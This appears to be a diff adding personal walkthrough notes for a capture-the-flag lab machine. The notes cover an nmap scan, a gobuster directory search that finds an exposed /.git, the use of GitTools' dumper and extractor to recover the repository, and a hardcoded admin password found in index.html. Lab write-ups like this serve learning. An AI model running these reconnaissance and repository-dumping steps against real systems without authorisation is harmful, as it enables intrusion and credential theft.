@@ -1,0 +1,24 @@
+First do an NMAP scan
+	sudo nmap -A -O -vv -sC -sV -p- 10.10.61.171
+Now we can do a directory buster
+	I ran quite a few, however the fastest one was common.txt
+		gobuster dir -u http://10.10.61.171/ -w /usr/share/wordlists/dirb/common.txt 
+			WE FIND A /.git/HEAD
+			this means we can use a gitdumper to see what is within the .git
+git clone https://github.com/internetwache/GitTools.git
+	cd GitTools
+		cd Dumper
+			./gitdumper.sh 10.10.61.171/.git/ .
+Now we have to extract what we just dumped
+	cd Extractor
+		./extractor.sh ~/GitTools/Dumper/ .
+			ls -la 
+				we see a lot of directories
+					cd 4-395e087334d613d5e423cdf8f7be27196a360459/
+						cat index.html
+			Now we can find the username and password!!!
+				  username === "admin" &&
+			          password === "Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!"
+
+
+
